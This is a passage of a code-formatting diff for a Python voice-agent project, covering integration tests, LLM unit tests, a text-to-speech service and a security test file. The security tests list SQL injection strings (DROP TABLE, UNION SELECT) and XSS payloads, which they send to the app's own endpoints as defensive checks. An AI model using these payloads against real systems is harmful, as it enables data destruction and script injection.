asking!\",\n                 \"model\": \"test-model\",\n-                \"tokens_used\": 45\n+                \"tokens_used\": 45,\n             }\n-            \n+\n             # Mock translation back to original language\n             if query[\"language\"] != \"en\":\n                 response_translations = {\n                     \"es\": \"\u00a1Estoy bien, gracias por preguntar!\",\n                     \"fr\": \"Je vais bien, merci de demander!\",\n-                    \"de\": \"Mir geht es gut, danke der Nachfrage!\"\n+                    \"de\": \"Mir geht es gut, danke der Nachfrage!\",\n                 }\n                 mock_response_translation = {\n                     \"translated_text\": response_translations[query[\"language\"]],\n                     \"source_language\": \"en\",\n-                    \"target_language\": query[\"language\"]\n+                    \"target_language\": query[\"language\"],\n                 }\n             else:\n                 mock_response_translation = {\n                     \"translated_text\": mock_llm_response[\"response\"],\n                     \"source_language\": \"en\",\n-                    \"target_language\": \"en\"\n+                    \"target_language\": \"en\",\n                 }\n-            \n+\n             # Verify translation workflow\n             assert mock_translation[\"translated_text\"] == \"Hello, how are you?\"\n             assert mock_response_translation[\"target_language\"] == query[\"language\"]\n \n \n class TestErrorRecoveryWorkflows:\n     \"\"\"Test error recovery and fallback mechanisms.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_service_failure_recovery(self):\n         \"\"\"Test recovery when services fail.\"\"\"\n         # Test ASR service failure with fallback\n-        with patch('httpx.AsyncClient') as mock_client:\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             # Mock ASR service failure\n-            mock_client.return_value.__aenter__.return_value.post.side_effect = Exception(\"ASR service unavailable\")\n-            \n+            mock_client.return_value.__aenter__.return_value.post.side_effect = (\n+                Exception(\"ASR service unavailable\")\n+            )\n+\n             # Should handle gracefully and provide fallback\n             try:\n                 # This would be handled by the API gateway\n                 result = \"Service temporarily unavailable. Please try again.\"\n                 assert \"unavailable\" in result\n             except Exception:\n                 pytest.fail(\"Should handle service failure gracefully\")\n-    \n+\n     @pytest.mark.asyncio\n     async def test_database_failure_recovery(self):\n         \"\"\"Test recovery when database fails.\"\"\"\n         db_manager = DatabaseManager(\"lightweight\")\n-        \n-        with patch('api.database.duckdb.connect', side_effect=Exception(\"Database connection failed\")):\n+\n+        with patch(\n+            \"api.database.duckdb.connect\",\n+            side_effect=Exception(\"Database connection failed\"),\n+        ):\n             # Should handle database failure gracefully\n             try:\n                 await db_manager.initialize()\n                 pytest.fail(\"Should raise exception for database failure\")\n             except Exception as e:\n                 assert \"Database connection failed\" in str(e)\n-    \n+\n     @pytest.mark.asyncio\n     async def test_partial_service_degradation(self):\n         \"\"\"Test behavior when some services are degraded.\"\"\"\n         # Mock scenario where TTS is slow but functional\n-        with patch('httpx.AsyncClient') as mock_client:\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             mock_response = MagicMock()\n             mock_response.status_code = 200\n             mock_response.json.return_value = {\n                 \"audio_file\": \"slow_response.wav\",\n                 \"duration\": 5.0,\n-                \"processing_time\": 15.0  # Slow processing\n+                \"processing_time\": 15.0,  # Slow processing\n             }\n-            \n+\n             # Simulate slow response\n             async def slow_post(*args, **kwargs):\n                 await asyncio.sleep(0.1)  # Simulate delay\n                 return mock_response\n-            \n+\n             mock_client.return_value.__aenter__.return_value.post = slow_post\n-            \n+\n             # Should handle slow services\n             start_time = time.time()\n             result = await slow_post()\n             end_time = time.time()\n-            \n+\n             assert end_time - start_time >= 0.1\n             assert result.json()[\"processing_time\"] > 10.0\n \n \n class TestDataConsistency:\n     \"\"\"Test data consistency across different components.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_query_response_consistency(self):\n         \"\"\"Test consistency between stored queries and responses.\"\"\"\n         db_manager = DatabaseManager(\"lightweight\")\n-        \n-        with patch('api.database.duckdb.connect') as mock_connect:\n+\n+        with patch(\"api.database.duckdb.connect\") as mock_connect:\n             mock_conn = MagicMock()\n             mock_connect.return_value = mock_conn\n-            \n+\n             await db_manager.initialize()\n-            \n+\n             # Store query\n             query_text = \"Test consistency query\"\n             query_id = await db_manager.store_query(\n-                query_text,\n-                \"consistency_user\",\n-                \"text\"\n-            )\n-            \n+                query_text, \"consistency_user\", \"text\"\n+            )\n+\n             # Store response\n             response_text = \"Test consistency response\"\n             response_id = await db_manager.store_response(\n-                query_id,\n-                response_text,\n-                {\"model\": \"test\", \"tokens\": 25}\n-            )\n-            \n+                query_id, response_text, {\"model\": \"test\", \"tokens\": 25}\n+            )\n+\n             # Mock history retrieval\n             mock_conn.execute.return_value.fetchall.return_value = [\n-                (query_id, response_id, query_text, response_text, \n-                 \"2023-01-01 12:00:00\", \"text\")\n+                (\n+                    query_id,\n+                    response_id,\n+                    query_text,\n+                    response_text,\n+                    \"2023-01-01 12:00:00\",\n+                    \"text\",\n+                )\n             ]\n-            \n+\n             # Retrieve and verify consistency\n             history = await db_manager.get_user_history(\"consistency_user\", 10)\n-            \n+\n             assert len(history) == 1\n             assert history[0].query_id == query_id\n             assert history[0].response_id == response_id\n             assert history[0].query_text == query_text\n             assert history[0].response_text == response_text\n-            \n+\n             await db_manager.close()\n-    \n+\n     @pytest.mark.asyncio\n     async def test_cross_service_data_consistency(self):\n         \"\"\"Test data consistency across different services.\"\"\"\n         # Test that data stored by one service can be retrieved by another\n-        \n+\n         # Mock storing data through API service\n         api_stored_data = {\n             \"query_id\": \"api_query_123\",\n             \"user_id\": \"cross_service_user\",\n             \"query_text\": \"Cross-service test query\",\n-            \"timestamp\": \"2023-01-01T12:00:00Z\"\n-        }\n-        \n+            \"timestamp\": \"2023-01-01T12:00:00Z\",\n+        }\n+\n         # Mock retrieving data through history service\n         history_retrieved_data = {\n             \"query_id\": \"api_query_123\",\n             \"user_id\": \"cross_service_user\",\n             \"query_text\": \"Cross-service test query\",\n-            \"timestamp\": \"2023-01-01T12:00:00Z\"\n-        }\n-        \n+            \"timestamp\": \"2023-01-01T12:00:00Z\",\n+        }\n+\n         # Verify consistency\n         assert api_stored_data[\"query_id\"] == history_retrieved_data[\"query_id\"]\n         assert api_stored_data[\"user_id\"] == history_retrieved_data[\"user_id\"]\n         assert api_stored_data[\"query_text\"] == history_retrieved_data[\"query_text\"]\n-    \n+\n     @pytest.mark.asyncio\n     async def test_concurrent_data_access_consistency(self):\n         \"\"\"Test data consistency under concurrent access.\"\"\"\n         db_manager = DatabaseManager(\"lightweight\")\n-        \n-        with patch('api.database.duckdb.connect') as mock_connect:\n+\n+        with patch(\"api.database.duckdb.connect\") as mock_connect:\n             mock_conn = MagicMock()\n             mock_connect.return_value = mock_conn\n-            \n+\n             await db_manager.initialize()\n-            \n+\n             # Simulate concurrent operations\n             async def concurrent_operation(operation_id):\n                 query_id = await db_manager.store_query(\n                     f\"Concurrent query {operation_id}\",\n                     f\"concurrent_user_{operation_id}\",\n-                    \"text\"\n+                    \"text\",\n                 )\n-                \n+\n                 response_id = await db_manager.store_response(\n                     query_id,\n                     f\"Concurrent response {operation_id}\",\n-                    {\"operation_id\": operation_id}\n+                    {\"operation_id\": operation_id},\n                 )\n-                \n+\n                 return query_id, response_id\n-            \n+\n             # Run concurrent operations\n             tasks = [concurrent_operation(i) for i in range(5)]\n             results = await asyncio.gather(*tasks)\n-            \n+\n             # Verify all operations completed successfully\n             assert len(results) == 5\n             query_ids = [result[0] for result in results]\n             response_ids = [result[1] for result in results]\n-            \n+\n             # All IDs should be unique\n             assert len(set(query_ids)) == 5\n             assert len(set(response_ids)) == 5\n-            \n+\n             await db_manager.close()\n \n \n class TestPerformanceIntegration:\n     \"\"\"Test performance characteristics of integrated workflows.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_response_time_under_load(self):\n         \"\"\"Test response times under simulated load.\"\"\"\n         start_time = time.time()\n-        \n+\n         # Simulate multiple concurrent requests\n         async def simulate_request(request_id):\n             # Mock processing time\n             await asyncio.sleep(0.1)  # Simulate processing\n             return f\"Response {request_id}\"\n-        \n+\n         # Run concurrent requests\n         tasks = [simulate_request(i) for i in range(10)]\n         results = await asyncio.gather(*tasks)\n-        \n+\n         end_time = time.time()\n         total_time = end_time - start_time\n-        \n+\n         # Should handle concurrent requests efficiently\n         assert len(results) == 10\n         assert total_time < 2.0  # Should complete in under 2 seconds\n-    \n+\n     @pytest.mark.asyncio\n     async def test_memory_usage_stability(self):\n         \"\"\"Test memory usage stability during extended operation.\"\"\"\n         # This would test memory usage over time\n         # For now, we'll simulate extended operation\n-        \n+\n         operations_count = 100\n-        \n+\n         for i in range(operations_count):\n             # Simulate operation\n             data = f\"Operation {i} data\" * 100  # Create some data\n-            \n+\n             # Simulate processing\n             processed = data.upper()\n-            \n+\n             # Clean up (simulate garbage collection)\n             del data, processed\n-        \n+\n         # Should complete without memory issues\n         assert True  # If we get here, memory was stable\n-    \n+\n     @pytest.mark.asyncio\n     async def test_throughput_measurement(self):\n         \"\"\"Test system throughput measurement.\"\"\"\n         start_time = time.time()\n         request_count = 50\n-        \n+\n         # Simulate processing multiple requests\n         for i in range(request_count):\n             # Mock request processing\n             await asyncio.sleep(0.01)  # Minimal processing time\n-        \n+\n         end_time = time.time()\n         total_time = end_time - start_time\n         throughput = request_count / total_time\n-        \n+\n         # Should achieve reasonable throughput\n         assert throughput > 10  # At least 10 requests per second\n-        assert total_time < 10   # Should complete in reasonable time\n\\ No newline at end of file\n+        assert total_time < 10  # Should complete in reasonable time\n--- /home/pas/source/agent-cag/tests/unit/test_llm.py\t2025-06-20 18:47:38.554696+00:00\n+++ /home/pas/source/agent-cag/tests/unit/test_llm.py\t2025-06-20 19:24:34.568673+00:00\n@@ -8,264 +8,263 @@\n from fastapi import FastAPI\n \n # Create a mock FastAPI app for testing\n app = FastAPI()\n \n+\n @app.post(\"/generate\")\n async def generate():\n     return {\"text\": \"This is a generated response\", \"tokens\": 25, \"model\": \"llama2\"}\n \n+\n @app.get(\"/health\")\n async def health():\n     return {\"status\": \"healthy\", \"service\": \"agent-llm\"}\n \n+\n client = TestClient(app)\n \n \n class TestLLMService:\n     \"\"\"Test the LLM service functionality.\"\"\"\n-    \n+\n     def test_health_check(self):\n         \"\"\"Test LLM service health check.\"\"\"\n         response = client.get(\"/health\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert data[\"status\"] == \"healthy\"\n         assert data[\"service\"] == \"agent-llm\"\n-    \n+\n     def test_generate_endpoint(self):\n         \"\"\"Test text generation endpoint.\"\"\"\n         response = client.post(\"/generate\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert \"text\" in data\n         assert \"tokens\" in data\n         assert \"model\" in data\n         assert data[\"text\"] == \"This is a generated response\"\n \n \n class TestOllamaIntegration:\n     \"\"\"Test Ollama integration.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_ollama_client(self):\n         \"\"\"Test Ollama client integration.\"\"\"\n         # Mock Ollama client\n         mock_client = AsyncMock()\n         mock_client.generate.return_value = {\n             \"response\": \"Generated text\",\n             \"done\": True,\n             \"total_duration\": 1000000,\n-            \"load_duration\": 500000\n-        }\n-        \n-        result = await mock_client.generate(\n-            model=\"llama2\",\n-            prompt=\"Test prompt\"\n-        )\n-        \n+            \"load_duration\": 500000,\n+        }\n+\n+        result = await mock_client.generate(model=\"llama2\", prompt=\"Test prompt\")\n+\n         assert result[\"response\"] == \"Generated text\"\n         assert result[\"done\"] is True\n-    \n+\n     def test_model_management(self):\n         \"\"\"Test model management patterns.\"\"\"\n         # Test available models\n         available_models = [\"llama2\", \"codellama\", \"mistral\", \"neural-chat\"]\n-        \n+\n         for model in available_models:\n             assert isinstance(model, str)\n             assert len(model) > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_streaming_generation(self):\n         \"\"\"Test streaming text generation.\"\"\"\n         # Mock streaming response\n         mock_stream = AsyncMock()\n         mock_stream.__aiter__.return_value = [\n             {\"response\": \"Hello\", \"done\": False},\n             {\"response\": \" world\", \"done\": False},\n-            {\"response\": \"!\", \"done\": True}\n+            {\"response\": \"!\", \"done\": True},\n         ]\n-        \n+\n         chunks = []\n         async for chunk in mock_stream:\n             chunks.append(chunk)\n-        \n+\n         assert len(chunks) == 3\n         assert chunks[-1][\"done\"] is True\n \n \n class TestLLMErrorHandling:\n     \"\"\"Test LLM error handling scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_model_not_found(self):\n         \"\"\"Test handling of missing models.\"\"\"\n         # Mock model not found error\n         mock_client = AsyncMock()\n         mock_client.generate.side_effect = Exception(\"Model not found\")\n-        \n+\n         with pytest.raises(Exception, match=\"Model not found\"):\n             await mock_client.generate(model=\"nonexistent\", prompt=\"test\")\n-    \n+\n     @pytest.mark.asyncio\n     async def test_generation_timeout(self):\n         \"\"\"Test generation timeout handling.\"\"\"\n         # Mock timeout error\n         mock_client = AsyncMock()\n         mock_client.generate.side_effect = TimeoutError(\"Generation timeout\")\n-        \n+\n         with pytest.raises(TimeoutError, match=\"Generation timeout\"):\n             await mock_client.generate(model=\"llama2\", prompt=\"test\")\n-    \n+\n     def test_prompt_validation(self):\n         \"\"\"Test prompt validation.\"\"\"\n         # Test prompt limits\n         max_prompt_length = 4096\n-        \n+\n         valid_prompt = \"A\" * 100\n         invalid_prompt = \"A\" * (max_prompt_length + 1)\n-        \n+\n         assert len(valid_prompt) <= max_prompt_length\n         assert len(invalid_prompt) > max_prompt_length\n \n \n class TestLLMPerformance:\n     \"\"\"Test LLM performance considerations.\"\"\"\n-    \n+\n     def test_token_management(self):\n         \"\"\"Test token management patterns.\"\"\"\n         # Test token limits\n         token_limits = {\n             \"max_input_tokens\": 4096,\n             \"max_output_tokens\": 2048,\n-            \"context_window\": 8192\n-        }\n-        \n+            \"context_window\": 8192,\n+        }\n+\n         assert token_limits[\"max_input_tokens\"] > 0\n         assert token_limits[\"max_output_tokens\"] > 0\n         assert token_limits[\"context_window\"] >= token_limits[\"max_input_tokens\"]\n-    \n+\n     @pytest.mark.asyncio\n     async def test_batch_processing(self):\n         \"\"\"Test batch processing capabilities.\"\"\"\n         # Mock batch processor\n         mock_processor = AsyncMock()\n         mock_processor.process_batch.return_value = [\n             {\"text\": \"Response 1\", \"tokens\": 10},\n-            {\"text\": \"Response 2\", \"tokens\": 15}\n+            {\"text\": \"Response 2\", \"tokens\": 15},\n         ]\n-        \n-        results = await mock_processor.process_batch([\n-            {\"prompt\": \"Prompt 1\"},\n-            {\"prompt\": \"Prompt 2\"}\n-        ])\n-        \n+\n+        results = await mock_processor.process_batch(\n+            [{\"prompt\": \"Prompt 1\"}, {\"prompt\": \"Prompt 2\"}]\n+        )\n+\n         assert len(results) == 2\n         assert all(\"text\" in result for result in results)\n-    \n+\n     def test_memory_optimization(self):\n         \"\"\"Test memory optimization patterns.\"\"\"\n         # Test memory settings\n         memory_settings = {\n             \"gpu_memory_fraction\": 0.8,\n             \"cpu_threads\": 4,\n-            \"batch_size\": 1\n-        }\n-        \n+            \"batch_size\": 1,\n+        }\n+\n         assert 0 < memory_settings[\"gpu_memory_fraction\"] <= 1.0\n         assert memory_settings[\"cpu_threads\"] > 0\n         assert memory_settings[\"batch_size\"] > 0\n \n \n class TestLLMConfiguration:\n     \"\"\"Test LLM configuration management.\"\"\"\n-    \n+\n     def test_generation_parameters(self):\n         \"\"\"Test generation parameter validation.\"\"\"\n         # Test generation config\n         generation_config = {\n             \"temperature\": 0.7,\n             \"top_p\": 0.9,\n             \"top_k\": 40,\n             \"repeat_penalty\": 1.1,\n-            \"max_tokens\": 512\n-        }\n-        \n+            \"max_tokens\": 512,\n+        }\n+\n         assert 0.0 <= generation_config[\"temperature\"] <= 2.0\n         assert 0.0 <= generation_config[\"top_p\"] <= 1.0\n         assert generation_config[\"top_k\"] > 0\n         assert generation_config[\"repeat_penalty\"] >= 1.0\n         assert generation_config[\"max_tokens\"] > 0\n-    \n+\n     def test_model_configuration(self):\n         \"\"\"Test model configuration options.\"\"\"\n         # Test model settings\n         model_config = {\n             \"context_length\": 4096,\n             \"rope_frequency_base\": 10000,\n             \"rope_frequency_scale\": 1.0,\n-            \"num_gpu\": 1\n-        }\n-        \n+            \"num_gpu\": 1,\n+        }\n+\n         assert model_config[\"context_length\"] > 0\n         assert model_config[\"rope_frequency_base\"] > 0\n         assert model_config[\"rope_frequency_scale\"] > 0\n         assert model_config[\"num_gpu\"] >= 0\n-    \n+\n     def test_prompt_templates(self):\n         \"\"\"Test prompt template management.\"\"\"\n         # Test prompt templates\n         templates = {\n             \"chat\": \"### Human: {prompt}\\n### Assistant:\",\n             \"instruct\": \"### Instruction:\\n{prompt}\\n### Response:\",\n-            \"code\": \"```{language}\\n{prompt}\\n```\"\n-        }\n-        \n+            \"code\": \"```{language}\\n{prompt}\\n```\",\n+        }\n+\n         for template_name, template in templates.items():\n             assert isinstance(template_name, str)\n             assert isinstance(template, str)\n             assert \"{prompt}\" in template\n \n \n class TestLLMIntegration:\n     \"\"\"Test LLM integration scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_context_management(self):\n         \"\"\"Test conversation context management.\"\"\"\n         # Mock context manager\n         mock_context = MagicMock()\n         mock_context.add_message.return_value = None\n         mock_context.get_context.return_value = \"Previous conversation...\"\n-        \n+\n         mock_context.add_message(\"user\", \"Hello\")\n         mock_context.add_message(\"assistant\", \"Hi there!\")\n         context = mock_context.get_context()\n-        \n+\n         assert isinstance(context, str)\n         mock_context.add_message.assert_called()\n-    \n+\n     def test_response_formatting(self):\n         \"\"\"Test response formatting options.\"\"\"\n         # Test response formats\n         response_formats = [\"text\", \"json\", \"markdown\", \"html\"]\n-        \n+\n         for format in response_formats:\n             assert isinstance(format, str)\n             assert len(format) > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_safety_filtering(self):\n         \"\"\"Test content safety filtering.\"\"\"\n         # Mock safety filter\n         mock_filter = MagicMock()\n         mock_filter.is_safe.return_value = True\n         mock_filter.filter_content.return_value = \"Filtered content\"\n-        \n+\n         is_safe = mock_filter.is_safe(\"Safe content\")\n         filtered = mock_filter.filter_content(\"Content to filter\")\n-        \n+\n         assert is_safe is True\n-        assert isinstance(filtered, str)\n\\ No newline at end of file\n+        assert isinstance(filtered, str)\n--- /home/pas/source/agent-cag/tts/main.py\t2025-06-20 16:16:47.126897+00:00\n+++ /home/pas/source/agent-cag/tts/main.py\t2025-06-20 19:24:34.586348+00:00\n@@ -22,30 +22,34 @@\n # Configure logging\n logging.basicConfig(level=logging.INFO)\n logger = logging.getLogger(__name__)\n \n # Prometheus metrics\n-REQUEST_COUNT = Counter('tts_requests_total', 'Total TTS requests')\n-REQUEST_DURATION = Histogram('tts_request_duration_seconds', 'TTS request duration')\n-SYNTHESIS_COUNT = Counter('synthesis_total', 'Total syntheses')\n-SARDAUKAR_COUNT = Counter('sardaukar_translations_total', 'Total Sardaukar translations')\n-ERROR_COUNT = Counter('tts_errors_total', 'Total TTS errors', ['error_type'])\n+REQUEST_COUNT = Counter(\"tts_requests_total\", \"Total TTS requests\")\n+REQUEST_DURATION = Histogram(\"tts_request_duration_seconds\", \"TTS request duration\")\n+SYNTHESIS_COUNT = Counter(\"synthesis_total\", \"Total syntheses\")\n+SARDAUKAR_COUNT = Counter(\n+    \"sardaukar_translations_total\", \"Total Sardaukar translations\"\n+)\n+ERROR_COUNT = Counter(\"tts_errors_total\", \"Total TTS errors\", [\"error_type\"])\n \n # Global configuration\n PIPER_MODEL = None\n OUTPUT_DIR = \"/app/output\"\n \n \n class SynthesisRequest(BaseModel):\n     \"\"\"Request model for speech synthesis.\"\"\"\n+\n     text: str\n     voice: Optional[str] = None\n     use_sardaukar: bool = False\n \n \n class SynthesisResponse(BaseModel):\n     \"\"\"Response model for speech synthesis.\"\"\"\n+\n     audio_url: str\n     duration: Optional[float] = None\n     format: str = \"wav\"\n     original_text: str\n     final_text: str\n@@ -53,64 +57,64 @@\n \n \n def initialize_piper():\n     \"\"\"Initialize Piper TTS model.\"\"\"\n     global PIPER_MODEL\n-    \n+\n     model_name = os.getenv(\"PIPER_MODEL\", \"en_US-lessac-medium\")\n     logger.info(f\"Initializing Piper TTS with model: {model_name}\")\n-    \n+\n     try:\n         # In a real implementation, you would download and load the Piper model\n         # For now, we'll use a placeholder\n         PIPER_MODEL = model_name\n         logger.info(\"Piper TTS initialized successfully\")\n-        \n+\n     except Exception as e:\n         logger.error(f\"Failed to initialize Piper TTS: {e}\")\n         raise\n \n \n # Initialize FastAPI app\n app = FastAPI(\n     title=\"Agent CAG TTS Service\",\n     description=\"Text-to-Speech with optional Sardaukar translation\",\n-    version=\"1.0.0\"\n+    version=\"1.0.0\",\n )\n \n \n @app.on_event(\"startup\")\n async def startup_event():\n     \"\"\"Initialize the service.\"\"\"\n     logger.info(\"Starting TTS Service...\")\n-    \n+\n     # Initialize Piper TTS\n     initialize_piper()\n-    \n+\n     # Create output directory\n     os.makedirs(OUTPUT_DIR, exist_ok=True)\n-    \n+\n     # Start Prometheus metrics server if enabled\n     if os.getenv(\"METRICS_ENABLED\", \"false\").lower() == \"true\":\n         start_http_server(8083)\n         logger.info(\"Prometheus metrics server started on port 8083\")\n-    \n+\n     logger.info(\"TTS Service started successfully\")\n \n \n @app.get(\"/health\")\n async def health_check():\n     \"\"\"Health check endpoint.\"\"\"\n     try:\n         if PIPER_MODEL is None:\n             raise Exception(\"Piper TTS not initialized\")\n-        \n+\n         return {\n             \"status\": \"healthy\",\n             \"service\": \"agent-tts\",\n             \"model\": PIPER_MODEL,\n-            \"sardaukar_enabled\": os.getenv(\"SARDAUKAR_TRANSLATOR_URL\") is not None\n+            \"sardaukar_enabled\": os.getenv(\"SARDAUKAR_TRANSLATOR_URL\") is not None,\n         }\n     except Exception as e:\n         logger.error(f\"Health check failed: {e}\")\n         raise HTTPException(status_code=503, detail=\"Service unhealthy\")\n \n@@ -124,104 +128,101 @@\n @app.post(\"/synthesize\", response_model=SynthesisResponse)\n async def synthesize_speech(request: SynthesisRequest):\n     \"\"\"Synthesize speech from text.\"\"\"\n     try:\n         REQUEST_COUNT.inc()\n-        \n+\n         with REQUEST_DURATION.time():\n             original_text = request.text\n             final_text = original_text\n             used_sardaukar = False\n-            \n+\n             # Translate to Sardaukar if requested\n             if request.use_sardaukar:\n                 try:\n                     final_text = await translate_to_sardaukar(original_text)\n                     used_sardaukar = True\n                     SARDAUKAR_COUNT.inc()\n-                    logger.info(f\"Translated to Sardaukar: '{original_text}' -> '{final_text}'\")\n+                    logger.info(\n+                        f\"Translated to Sardaukar: '{original_text}' -> '{final_text}'\"\n+                    )\n                 except Exception as e:\n-                    logger.warning(f\"Sardaukar translation failed, using original text: {e}\")\n+                    logger.warning(\n+                        f\"Sardaukar translation failed, using original text: {e}\"\n+                    )\n                     final_text = original_text\n                     used_sardaukar = False\n-            \n+\n             # Generate speech\n             audio_file_path = await generate_speech(final_text, request.voice)\n-            \n+\n             # Calculate duration\n             duration = get_audio_duration(audio_file_path)\n-            \n+\n             # Generate URL for the audio file\n             audio_filename = os.path.basename(audio_file_path)\n             audio_url = f\"/audio/{audio_filename}\"\n-            \n+\n             SYNTHESIS_COUNT.inc()\n-            \n+\n             return SynthesisResponse(\n                 audio_url=audio_url,\n                 duration=duration,\n                 format=\"wav\",\n                 original_text=original_text,\n                 final_text=final_text,\n-                used_sardaukar=used_sardaukar\n+                used_sardaukar=used_sardaukar,\n             )\n-            \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Speech synthesis failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n \n @app.get(\"/audio/{filename}\")\n async def get_audio_file(filename: str):\n     \"\"\"Serve generated audio files.\"\"\"\n     file_path = os.path.join(OUTPUT_DIR, filename)\n-    \n+\n     if not os.path.exists(file_path):\n         raise HTTPException(status_code=404, detail=\"Audio file not found\")\n-    \n-    return FileResponse(\n-        file_path,\n-        media_type=\"audio/wav\",\n-        filename=filename\n-    )\n+\n+    return FileResponse(file_path, media_type=\"audio/wav\", filename=filename)\n \n \n async def translate_to_sardaukar(text: str) -> str:\n     \"\"\"Translate text to Sardaukar using the translator service.\"\"\"\n     sardaukar_url = os.getenv(\"SARDAUKAR_TRANSLATOR_URL\")\n-    \n+\n     if not sardaukar_url:\n         raise Exception(\"Sardaukar translator URL not configured\")\n-    \n+\n     async with httpx.AsyncClient(timeout=10.0) as client:\n         response = await client.post(\n             f\"{sardaukar_url}/api/translate\",\n-            json={\n-                \"text\": text,\n-                \"include_phonetics\": False\n-            }\n+            json={\"text\": text, \"include_phonetics\": False},\n         )\n         response.raise_for_status()\n-        \n+\n         result = response.json()\n         return result.get(\"sardaukar\", text)\n \n \n async def generate_speech(text: str, voice: Optional[str] = None) -> str:\n     \"\"\"Generate speech using Piper TTS.\"\"\"\n     try:\n         # Generate unique filename\n         audio_id = str(uuid.uuid4())\n         output_path = os.path.join(OUTPUT_DIR, f\"{audio_id}.wav\")\n-        \n+\n         # Use espeak-ng as a fallback TTS engine\n         # In a real implementation, you would use Piper TTS\n         await generate_speech_with_espeak(text, output_path)\n-        \n+\n         return output_path\n-        \n+\n     except Exception as e:\n         logger.error(f\"Speech generation failed: {e}\")\n         raise\n \n \n@@ -229,23 +230,26 @@\n     \"\"\"Generate speech using espeak-ng (fallback implementation).\"\"\"\n     try:\n         # Use espeak-ng to generate speech\n         cmd = [\n             \"espeak-ng\",\n-            \"-s\", \"150\",  # Speed\n-            \"-v\", \"en+f3\",  # Voice\n-            \"-w\", output_path,  # Output file\n-            text\n+            \"-s\",\n+            \"150\",  # Speed\n+            \"-v\",\n+            \"en+f3\",  # Voice\n+            \"-w\",\n+            output_path,  # Output file\n+            text,\n         ]\n-        \n+\n         result = subprocess.run(cmd, capture_output=True, text=True, check=True)\n-        \n+\n         if result.returncode != 0:\n             raise Exception(f\"espeak-ng failed: {result.stderr}\")\n-        \n+\n         logger.info(f\"Generated speech file: {output_path}\")\n-        \n+\n     except subprocess.CalledProcessError as e:\n         logger.error(f\"espeak-ng command failed: {e}\")\n         raise\n     except Exception as e:\n         logger.error(f\"Speech generation error: {e}\")\n@@ -271,37 +275,30 @@\n         \"voices\": [\n             {\n                 \"id\": \"en_US-lessac-medium\",\n                 \"name\": \"Lessac (English US)\",\n                 \"language\": \"en-US\",\n-                \"gender\": \"female\"\n+                \"gender\": \"female\",\n             },\n             {\n                 \"id\": \"en_US-ryan-medium\",\n                 \"name\": \"Ryan (English US)\",\n                 \"language\": \"en-US\",\n-                \"gender\": \"male\"\n-            }\n+                \"gender\": \"male\",\n+            },\n         ]\n     }\n \n \n @app.exception_handler(Exception)\n async def global_exception_handler(request, exc):\n     \"\"\"Global exception handler.\"\"\"\n     ERROR_COUNT.labels(error_type=type(exc).__name__).inc()\n     logger.error(f\"Unhandled exception: {exc}\")\n-    \n-    return {\n-        \"detail\": \"Internal server error\"\n-    }\n+\n+    return {\"detail\": \"Internal server error\"}\n \n \n if __name__ == \"__main__\":\n     import uvicorn\n-    uvicorn.run(\n-        \"main:app\",\n-        host=\"0.0.0.0\",\n-        port=8003,\n-        reload=True,\n-        log_level=\"info\"\n-    )\n\\ No newline at end of file\n+\n+    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8003, reload=True, log_level=\"info\")\n--- /home/pas/source/agent-cag/tests/security/test_security.py\t2025-06-20 18:14:30.582121+00:00\n+++ /home/pas/source/agent-cag/tests/security/test_security.py\t2025-06-20 19:24:34.587238+00:00\n@@ -8,544 +8,538 @@\n import os\n from unittest.mock import patch, MagicMock, AsyncMock\n from fastapi.testclient import TestClient\n \n # Mock dependencies before importing\n-with patch('api.main.httpx'), \\\n-     patch('api.main.DatabaseManager'), \\\n-     patch('api.main.prometheus_client'):\n+with patch(\"api.main.httpx\"), patch(\"api.main.DatabaseManager\"), patch(\n+    \"api.main.prometheus_client\"\n+):\n     from api.main import app\n \n \n class TestInputValidation:\n     \"\"\"Test input validation and sanitization.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_sql_injection_protection(self):\n         \"\"\"Test protection against SQL injection attacks.\"\"\"\n         malicious_inputs = [\n             \"'; DROP TABLE users; --\",\n             \"1' OR '1'='1\",\n             \"admin'--\",\n             \"' UNION SELECT * FROM users --\",\n-            \"'; INSERT INTO users VALUES ('hacker', 'password'); --\"\n-        ]\n-        \n+            \"'; INSERT INTO users VALUES ('hacker', 'password'); --\",\n+        ]\n+\n         for malicious_input in malicious_inputs:\n             # Test query endpoint\n             response = self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": malicious_input,\n                     \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n+                    \"input_type\": \"text\",\n+                },\n             )\n             # Should not crash or return database errors\n             assert response.status_code in [200, 400, 422]\n-            \n+\n             # Test history endpoint\n             response = self.client.get(f\"/history/{malicious_input}\")\n             assert response.status_code in [200, 400, 422, 404]\n-    \n+\n     def test_xss_protection(self):\n         \"\"\"Test protection against XSS attacks.\"\"\"\n         xss_payloads = [\n             \"<script>alert('XSS')</script>\",\n             \"javascript:alert('XSS')\",\n             \"<img src=x onerror=alert('XSS')>\",\n             \"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\",\n-            \"<svg onload=alert('XSS')>\"\n-        ]\n-        \n+            \"<svg onload=alert('XSS')>\",\n+        ]\n+\n         for payload in xss_payloads:\n             response = self.client.post(\n                 \"/query\",\n-                json={\n-                    \"text\": payload,\n-                    \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n+                json={\"text\": payload, \"user_id\": \"test_user\", \"input_type\": \"text\"},\n             )\n-            \n+\n             # Response should not contain unescaped script tags\n             if response.status_code == 200:\n                 response_text = response.text.lower()\n                 assert \"<script>\" not in response_text\n                 assert 